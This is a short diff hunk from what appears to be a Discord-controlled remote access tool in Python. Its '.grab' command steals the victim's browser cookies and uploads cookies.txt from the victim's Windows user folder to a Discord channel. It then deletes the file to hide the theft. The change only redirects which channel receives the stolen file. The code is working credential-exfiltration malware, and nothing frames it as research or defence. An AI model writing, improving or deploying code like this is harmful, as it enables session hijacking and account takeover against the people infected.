@@ -44,7 +44,7 @@ elif message.content[:5] == '.grab':
             grab_cookies()
             #.log Grabbed cookies 
             await asyncio.sleep(1)
-            reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
+            reaction_msg = await message.channel.send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
             #.log Sent message with grabbed cookies 
             subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
             #.log Removed cookies.txt 
